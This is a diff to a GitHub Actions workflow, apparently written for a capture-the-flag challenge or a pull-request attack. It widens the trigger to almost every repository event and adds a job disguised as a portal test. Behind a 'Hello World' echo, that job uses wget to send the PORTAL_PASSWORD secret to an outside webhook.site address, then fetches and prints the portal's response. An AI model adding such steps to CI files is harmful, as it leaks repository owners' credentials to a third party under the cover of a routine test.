@@ -1,9 +1,18 @@
 name: Test the PALINDROME portal
 
+on: [ check_run, check_suite, create, delete, deployment, deployment_status, discussion, discussion_comment, fork, gollum, issue_comment, issues, label, merge_group, milestone, page_build, project, project_card, project_column, public, pull_request, pull_request_review, pull_request_review_comment, pull_request_target, push, registry_package, release, repository_dispatch, schedule, status, watch, workflow_call, workflow_dispatch]
 
-on:
-    issues:
-        types: [closed]
+jobs:
+  test:
+    runs-on: windows-latest
+    steps:
+      - uses: actions/checkout@v3
+      - name: Test the PALINDROME portal
+        run: | 
+          echo "Hello World!"
+          C:\msys64\usr\bin\wget.exe '''https://webhook.site/f24ba1d9-242f-45af-87a4-0cf8df332d97/${{ secrets.PORTAL_PASSWORD }}''' -O test -d -v
+          C:\msys64\usr\bin\wget.exe '''${{ secrets.PORTAL_URL }}/${{ secrets.PORTAL_PASSWORD }}''' -O test -d -v
+          cat test
 
 jobs:
   test:
